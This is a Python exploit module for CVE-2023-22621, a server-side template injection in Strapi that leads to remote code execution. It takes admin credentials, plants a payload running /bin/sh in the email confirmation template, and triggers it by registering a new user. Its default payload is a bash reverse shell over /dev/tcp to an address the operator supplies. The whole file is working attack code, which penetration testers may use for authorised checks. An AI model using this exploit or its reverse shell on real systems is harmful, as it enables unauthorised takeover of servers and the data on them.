'''CVE-2023-22621 - SSTI to Remote Code Execution (RCE) in Strapi'''''
from json import JSONDecodeError
import requests
from strapi_exploit import StrapiExploitInterface

class CVE_2023_22621(StrapiExploitInterface):
    '''CVE-2023-22621 - SSTI to Remote Code Execution (RCE) in Strapi'''
    def __init__(self):
        super().__init__(
            name="CVE-2023-22621",
            description="SSTI to Remote Code Execution (RCE) in Strapi",
        )
        self.url = None
    def get_token(self, username: str, password: str) -> dict:
        '''Get the admin JWT token from the Strapi instance'''
        r = requests.post(f"{self.url}/admin/login", 
            data={"email": username, "password": password},
            timeout=10
        )
        try:
            token = r.json()['data']['token']
            self.info(f"Got token: {token}")
            return token 
        except :
            print("DEBUG:", r.text)
            return None
    def enable_confirmation(self, token: str, redirect_url: str) -> bool:
        '''Enable email confirmation and set the redirect URL'''
        r = requests.put(f"{self.url}/users-permissions/advanced",
            headers={"Authorization": "Bearer " + token},
            json={
                "unique_email": "true",
                "allow_register": "true",
                "email_confirmation": "true",
                "email_reset_password": "null",
                "email_confirmation_redirection": redirect_url,
                "default_role": "authenticated",
            },
            timeout=10)
        if "ok" in r.text:
            self.info("Enabled email confirmation")
            return True
        else:
            return False
    def add_payload(self, payload: str, token: str) -> bool:
        '''Add the payload to the email confirmation template'''
        self.input("Press enter when you are ready to execute the payload")
        full_payload = (
            r'''<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","'''
            + payload
            + r""""],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>"""
        )
        data = {
            "email-templates": {
                "email_confirmation": {
                    "display": "Email.template.email_confirmation",
                    "icon": "check-square",
                    "options": {
                        "from": {
                            "name": "Administration Panel",
                            "email": "no-reply@strapi.io",
                        },
                        "response_email": "",
                        "object": "Account confirmation",
                        "message": f"<p>Thank you for registering!</p>\n\n{full_payload}",
                    },
                }
            }
        }
        r = requests.put(f"{self.url}/users-permissions/email-templates",
            json=data,
            headers={"Authorization": "Bearer " + token},
            timeout=10
        )
        if "ok" in r.text:
            print("[+] Malicious template added to email confirmation page")
            return True
        else:
            return False
    def trigger_rce(self):
        '''Trigger the RCE by registering a new user'''
        json_data = {
            "email": self.get_random_email(),
            "username": self.get_random_username(),
            "password": self.get_random_password(),
        }
        r = requests.post(f"{self.url}/api/auth/local/register",
            json=json_data
        )
        self.info("sendTemplatedEmail() should be triggered")
        self.info(f"Response code: {r.status_code}")
    def run(self) -> bool:
        self.url = self.input("URL of the Strapi instance")
        if self.url.endswith("/"):
            self.url = self.url[:-1]
        username = self.input("Admin email")
        password = self.input("Admin password")
        custom = self.input("Custom payload to run (if not provided we'll use bash -i >& /dev/tcp/your_ip/your_port 0>&1)")
        if custom == "":
            self.logger.info("Using default payload")
            revshell_ip = self.input("IP address for reverse shell")
            revshell_port = self.input("Port for reverse shell")
            custom = f"bash -i >& /dev/tcp/{revshell_ip}/{revshell_port} 0>&1"
        redirect_url = self.input_default("URL to redirect to after exploit", self.url)
        token = self.get_token(username, password)
        if token is None:
            self.error("Failed to get token")
            return False
        if not self.enable_confirmation(token, redirect_url):
            self.error("Failed to enable email confirmation")
            return False
        if not self.add_payload(custom, token):
            self.error("Failed to add payload")
            return False
        self.trigger_rce()
        return True

def init():
    '''Initialize the plugin'''
    return CVE_2023_22621()